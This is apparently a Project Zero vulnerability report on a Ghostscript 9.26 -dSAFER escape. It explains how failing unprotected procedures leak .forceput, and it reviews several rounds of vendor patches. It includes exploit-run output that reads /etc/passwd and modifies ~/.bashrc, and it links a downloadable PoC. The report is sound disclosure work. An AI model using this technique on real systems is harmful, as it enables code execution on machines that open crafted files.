@@ -1,0 +1,264 @@
+I noticed ghostscript 9.26 was released, so had a quick look and spotted some errors. For background, this is how you define a subroutine in postscript:
+
+/hello {
+    (hello\n) print
+} def
+
+That's simple enough, but because a subroutine is just an executable array of commands, you need to mark it as executeonly if you're using system operators. That way, users can't peek inside and get references to operators they shouldn't be allowed to use.
+
+/hello {
+    (hello\n) print
+} executeonly def
+
+That's still not enough though, because the routine might expose the contents to error handlers, so you also need to make it a pseudo-operator with odef. PostScript error handlers don't examine any deeper than the current operator (or pseudo-operator), so won't expose any of the contents if they stop.
+
+/hello {
+    (hello\n) print
+} executeonly odef
+
+Looks good, but it gets weirder. If you don't bind the contents, then name resolution happens on execution, not when you define it. That means that someone can change the dictstack (which kind of works like variable scope in other languages) so that commands and operators do something different than when you defined the subroutine.
+
+Like this:
+
+GS>/hello {
+    (hello\n) print
+} executeonly odef
+GS><< /print { (goodbye) == pop } >> begin          
+GS>hello
+(goodbye)
+
+This means you also need to bind the routine, and also be very aware when you're writing it of what cannot be resolved at define-time (nobody ever said writing postscript was easy, lol). So now we have this:
+
+/hello {
+    (hello\n) print
+} bind executeonly odef
+
+I think that's good enough for simple routines, but what if it's more complicated? The way you branch in PostScript is to create an ephemeral subroutine and pass it to the `if` or `ifelse` operators, like this:
+
+/hello {
+    time 1200 lt {
+        (good morning\n) print
+    } {
+        (good afternoon\n) print
+    } ifelse
+} bind executeonly odef
+
+Do those ephemeral routines also need to be protected? The answer is yes, they're pushed on the operand stack just like everything else, so can cause /stackoverflow or /execstackoverflow errors, and will then be exposed to error handlers.
+
+Ghostscript didn't protect a whole bunch of these ephemeral routines, here is one example:
+
+1123       {
+1124         currentglobal pdfdict gcheck .setglobal
+1125         pdfdict /.Qqwarning_issued //true .forceput
+1126         .setglobal
+1127         pdfformaterror
+1128       } ifelse
+
+You can see the routine itself is bound, executeonly and odef, but the ephemeral routines inside it used for conditions and loops are not protected.
+
+These bugs are starting to get trickier to exploit, you have to make an operator fail very precisely, but I made a demo that works in 9.26. This uses the trick I described above of taking over names that couldn't be resolved at define time by pushing a new dict on the dictstack. This gives me a high degree of control over the routine.
+
+$ gs -dSAFER -f ghostscript-926-forceput.ps 
+GPL Ghostscript GIT PRERELEASE 9.27 (2018-11-20)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+(Stage 0: PDFfile)
+(Stage 1: q)
+(Stage 3: oget)
+(Stage 4: pdfemptycount)
+(Stage 5: gput)
+(Stage 6: resolvestream)
+(Stage 7: pdfopdict)
+(Stage 8: .pdfruncontext)
+(Stage 9: pdfdict)
+(Stage 10: /stackoverflow)
+(   Last Parameter:){(\n   **** Error: File has unbalanced q/Q operators \(too many q's\)\n               Output may be incorrect.\n) pdfdict /.Qqwarning_issued --.knownget-- {{--pop--} {--.currentglobal-- pdfdict --scheck-- --.setglobal-- pdfdict /.Qqwarning_issued true --.forceput-- --.setglobal-- pdfformaterror} --ifelse--} {--.currentglobal-- pdfdict --scheck-- --.setglobal-- pdfdict /.Qqwarning_issued true --.forceput-- --.setglobal-- pdfformaterror} --ifelse--}
+(   Extracting .forceput...)
+(   Result:)--.forceput--
+(Stage 11: Exploitation...)
+(   Should now have complete control over ghostscript, attempting to read /etc/passwd...)
+(root:x:0:0:root:/root:/bin/bash)
+(All Done)
+$ tail -1 ~/.bashrc 
+echo pwned by postscript
+
+This exploit should work via evince, ImageMagick, nautilus, less, gimp, gv, etc, etc. It might require some adjustment to work on older versions, because it requires precise alignment of the operand stack, but 9.26 and earlier are all affected.
+
+p.s. I'm not regularly looking at ghostscript, this was just a random look at the new release. 
+
+#DeprecateUntrustedPostscript
+
+################################################################################
+
+Project Member Comment 2 by taviso@google.com, Dec 4
+I noticed someone point out on twitter that the default $LESSOPEN can invoke ImageMagick:
+
+https://twitter.com/jensvoid/status/1065948452872511488
+
+Naturally, that works with this too (just name the exploit foo.pcd)
+
+################################################################################
+
+Project Member Comment 3 by taviso@google.com, Dec 4
+This is ghostscript bug 700317
+
+################################################################################
+
+Project Member Comment 5 by taviso@google.com, Dec 12
+Artifex sent me a proposed patch to review, but their patch only fixed the vulnerability for /stackoverflow. I did use /stackoverflow in the testcase, but as I mentioned in the report, any error will do.
+
+I updated the exploit to use /typecheck instead, and sent it to them with an explanation of why the patch was insufficient.
+
+Artifex also informed me that they plan to sit on their patch for the full 90 days, and will not commit it to git or release it. I consider this a bad faith gaming of our disclosure policy, which is astonishing for an open source company.
+ 
+Ghostscript vulnerabilities have been discovered exploited in the wild in the past (e.g. http://ghostbutt.com/), sitting on exploits with patches available for months is really unacceptable. I know that Artifex commercial customers are already cc'd on the ghostscript bug tracker, which makes this even harder to stomach.
+
+$ ./gs -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f ghostscript-926-forceput-typecheck-example.ps 
+GPL Ghostscript GIT PRERELEASE 9.27 (2018-11-20)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+(Stage 0: PDFfile)
+(Stage 1: q)
+(Stage 3: oget)
+(Stage 4: pdfemptycount)
+(Stage 5: gput)
+(Stage 6: resolvestream)
+(Stage 7: pdfopdict)
+(Stage 8: .pdfruncontext)
+(Stage 9: pdfdict)
+Stage 10: /typecheck #1
+Stage 10: /typecheck #2
+(Stage 11: Exploitation...)
+(   Should now have complete control over ghostscript, attempting to read /etc/passwd...)
+(root:x:0:0:root:/root:/bin/bash)
+
+################################################################################
+
+Project Member Comment 6 by taviso@google.com, Dec 14
+Artifex sent me a new proposed patch to review, this one changes all branches in system routines to look like this:
+
+/blah {
+    {
+      foo
+    } executeonly {
+      bar
+    } executeonly ifelse
+} def
+
+That solution doesn't work, because it doesn't stop you extracting the routine, waiting for the stack to unwind then executing it outside pseudo-op context. That allows the error handler to access internals, so you just cause random errors and extract any contents you like. (I'm aware this is really getting into the postscript weeds, but basically "just" being executeonly is useless). Here is an updated exploit that works with executeonly branches.
+
+$ ./gs -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f ghostscript-926-forceput-typecheck-executeonly-example.ps 
+GPL Ghostscript GIT PRERELEASE 9.27 (2018-11-20)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+(Stage 0: PDFfile)
+(Stage 1: q)
+(Stage 3: oget)
+(Stage 4: pdfemptycount)
+(Stage 5: gput)
+(Stage 6: resolvestream)
+(Stage 7: pdfopdict)
+(Stage 8: .pdfruncontext)
+(Stage 9: pdfdict)
+Stage 10: /typecheck #1
+Stage 10: /typecheck #2
+(Stage 9: pdfdict)
+(Stage 9: pdfdict)
+Stage 10: /typecheck #3
+(Stage 11: Exploitation...)
+(   Should now have complete control over ghostscript, attempting to read /etc/passwd...)
+(root:x:0:0:root:/root:/bin/bash)
+
+I sent this to Artifex and explained why their solution wont work.
+
+I *think* the branches need to be named and pseudo-ops, but that will be really ugly and I doubt Artifex will implement that, more likely they will make an interpreter change.
+
+################################################################################
+
+Project Member Comment 7 by taviso@google.com, Dec 17
+Artifex sent me a new patch that changes how the $error dict works, instead of getting a reference to the failing operator, you get a name object (i.e. /--foo-- instead of --foo--).
+
+I *think* this works, but if any ephemeral routine can be run in an unexpected context, it might be a security issue. Artifex says they're going to manually check for any that look dangerous, but in my opinion it will take a while to iron out all possible attack vectors.
+
+I think this is a major change and requires some thought, even if I can't immediately think of a way to break it (other than the unexpected context thing).
+Project Member Comment 8 by taviso@google.com, Jan 7
+Artifex sent me a patch with more checking for abusable procedures (i.e. routines that are useful in an unexpected context), hiding some that are hard to reason about. I spent a morning double checking for any more that they had missed and found one in gs_fonts.ps:
+
+1105         dup 3 index .fontknownget
+1106          { dup /PathLoad 4 index //.putgstringcopy
+1107            4 1 roll pop pop pop //true exit
+1108          } if
+1109 
+
+
+.putgstringcopy is a dangerous operator, basically just a wrapper around .forceput. I wrote a quick demo that is able to extract a reference, and mailed it to Artifex.
+
+$ ./gs -dSAFER -sDEVICE=ppmraw -f example.ps 
+GPL Ghostscript GIT PRERELEASE 9.27 (2018-11-20)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+{--dup-- /PathLoad 4 --index-- --.putgstringcopy-- 4 1 --roll-- --pop-- --pop-- --pop-- true --exit--}
+--.putgstringcopy--
+
+I checked pretty thoroughly, and this is the only one I could find that they had missed - but a lot of the code is quite hard to reason about, so I'm not sure there are no more.
+
+################################################################################
+
+Project Member Comment 9 by taviso@google.com, Jan 8
+Artifex sent me a patch that makes that executeonly, but not the containing procedures as well, so I could still make them fail.
+
+e.g. this one in gs_fonts.ps:
+
+1137             } executeonly
+1138            if pop % Stack: origfontname fontdirectory path
+1139          }
+1140         if pop pop  % Stack: origfontname
+
+It doesn't matter that the inner one is executeonly, because if the outer one fails that one never gets called.
+
+$ ./gs -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f font.ps 
+GPL Ghostscript GIT PRERELEASE 9.27 (2018-11-20)
+Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
+This software comes with NO WARRANTY: see the file PUBLIC for details.
+.loadfont
+(.fontknownget, force /typecheck)
+--.forceundef-- operatortype
+GS>
+
+I sent an explanation to Artifex on why containing procedures also need to be fixed. I'm spending way too much time reviewing patches for this one bug, untrusted postscript needs to be deprecated asap.
+Project Member Comment 10 by taviso@google.com, Jan 9
+I got a new patchset from Artifex, this one has a set of five patches which should fix this bug. I've attached them for reference.
+
+################################################################################
+
+Project Member Comment 11 by taviso@google.com, Jan 9
+I think this patchset seems comprehensive, in summary:
+
+- Replaces references to operators with name objects in saved stacks for error handlers.
+- Makes all ephemeral procedures that contain dangerous operators executeonly, and any outer procedures. This isn't automated, they are manually changing the postscript.
+- Changes how error handlers behave in executeonly procedures so that faulting operators don't leak.
+- Rewrite a lot of code so less pseudo-operators are exposed to users, especially some that are complicated and hard to reason about.
+
+I think this will work, although it's hard to be confident they found all the transient routines - postscript is really hard to read.
+
+Assuming they found them all, this still requires that developers don't accidentally add new branches in any of the postscript and forget to make them executeonly, which seems like a very easy mistake to make.
+
+I asked if they would consider making dangerous operators search the estack for any non-executeonly routines, perhaps only for test runs - just to make sure future changes don't re-introduce this. Let's see what they say, it seems like a pretty simple change to me.
+Project Member Comment 12 by taviso@google.com, Jan 10
+Filed https://bugs.ghostscript.com/show_bug.cgi?id=700472 to cover regression tests:
+
+-----
+When bug 700317 is fixed, it will be important that any future changes to postscript resources don't introduce any new conditions or other control structures that aren't executeonly.
+
+This seems like a really easy mistake to make, just changing an if into an ifelse, or adding another test could introduce a vulnerability.
+
+I wonder if some of the dangerous routines, like .forceput and so on, could search the e_stack every time they're called to verify there are no non-executeonly routines on the call stack.
+
+I suppose this is only necessary for test-cluster runs, just to make sure nobody accidentally breaks the security guarantees. Just looking at count_exec_stack() in zcontrol.c, it seems like the code would be really simple.
+
+Just filing this enhancement request to think about this (or some other solution).
+-----
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46242.zip
